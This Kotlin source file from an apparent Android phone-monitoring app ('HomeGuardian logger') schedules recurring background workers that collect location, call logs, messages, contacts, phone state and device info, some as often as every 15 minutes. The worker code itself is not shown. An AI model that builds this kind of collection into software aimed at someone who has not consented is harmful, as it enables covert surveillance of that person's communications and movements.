package com.mshomeguardian.logger.workers

import android.content.Context
import android.util.Log
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

/**
 * Scheduler that sets up all periodic work tasks for the app
 */
object WorkerScheduler {
    private const val TAG = "WorkerScheduler"

    // Work tags
    private const val LOCATION_WORK_NAME = "LocationWork"
    private const val CALL_LOG_WORK_NAME = "CallLogWork"
    private const val MESSAGE_WORK_NAME = "MessageWork"
    private const val DEVICE_INFO_WORK_NAME = "DeviceInfoWork"
    private const val CONTACTS_WORK_NAME = "ContactsWork"
    private const val PHONE_STATE_WORK_NAME = "PhoneStateWork"

    /**
     * Schedule all workers
     */
    fun schedule(context: Context) {
        try {
            Log.d(TAG, "Scheduling all workers")
            scheduleLocationWork(context)
            scheduleCallLogWork(context)
            scheduleMessageWork(context)
            scheduleDeviceInfoWork(context)
            scheduleContactsWork(context)
            schedulePhoneStateWork(context)
            Log.d(TAG, "All workers scheduled successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error scheduling workers", e)
        }
    }

    /**
     * Schedule location tracking worker
     */
    fun scheduleLocationWork(context: Context) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val locationWorkRequest = PeriodicWorkRequestBuilder<LocationWorker>(
            15, TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            LOCATION_WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            locationWorkRequest
        )

        Log.d(TAG, "Location worker scheduled")
    }

    /**
     * Schedule call log sync worker
     */
    fun scheduleCallLogWork(context: Context) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val callLogWorkRequest = PeriodicWorkRequestBuilder<CallLogWorker>(
            15, TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            CALL_LOG_WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            callLogWorkRequest
        )

        Log.d(TAG, "Call log worker scheduled")
    }

    /**
     * Schedule message sync worker
     */
    fun scheduleMessageWork(context: Context) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val messageWorkRequest = PeriodicWorkRequestBuilder<MessageWorker>(
            15, TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            MESSAGE_WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            messageWorkRequest
        )

        Log.d(TAG, "Message worker scheduled")
    }

    /**
     * Schedule device info update worker
     * This runs less frequently as device info changes less often
     */
    fun scheduleDeviceInfoWork(context: Context) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val deviceInfoWorkRequest = PeriodicWorkRequestBuilder<DeviceInfoWorker>(
            24, TimeUnit.HOURS
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            DEVICE_INFO_WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            deviceInfoWorkRequest
        )

        Log.d(TAG, "Device info worker scheduled")
    }

    /**
     * Schedule contacts sync worker
     */
    fun scheduleContactsWork(context: Context) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val contactsWorkRequest = PeriodicWorkRequestBuilder<ContactsWorker>(
            24, TimeUnit.HOURS // Contacts change less frequently
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            CONTACTS_WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            contactsWorkRequest
        )

        Log.d(TAG, "Contacts worker scheduled")
    }

    /**
     * Schedule phone state monitoring worker
     */
    fun schedulePhoneStateWork(context: Context) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val phoneStateWorkRequest = PeriodicWorkRequestBuilder<PhoneStateWorker>(
            30, TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            PHONE_STATE_WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            phoneStateWorkRequest
        )

        Log.d(TAG, "Phone state worker scheduled")
    }

    /**
     * Run all workers immediately (for testing or initial sync)
     */
    fun runAllWorkersOnce(context: Context) {
        try {
            WorkManager.getInstance(context).run {
                // Run location worker
                enqueue(OneTimeWorkRequestBuilder<LocationWorker>().build())

                // Run call log worker
                enqueue(OneTimeWorkRequestBuilder<CallLogWorker>().build())

                // Run message worker
                enqueue(OneTimeWorkRequestBuilder<MessageWorker>().build())

                // Run device info worker
                enqueue(OneTimeWorkRequestBuilder<DeviceInfoWorker>().build())

                // Run contacts worker
                enqueue(OneTimeWorkRequestBuilder<ContactsWorker>().build())

                // Run phone state worker
                enqueue(OneTimeWorkRequestBuilder<PhoneStateWorker>().build())
            }
            Log.d(TAG, "All one-time workers enqueued successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error running one-time workers", e)
        }
    }

    /**
     * Cancel all scheduled workers
     */
    fun cancelAllWork(context: Context) {
        try {
            WorkManager.getInstance(context).cancelAllWork()
            Log.d(TAG, "All work cancelled")
        } catch (e: Exception) {
            Log.e(TAG, "Error cancelling work", e)
        }
    }
}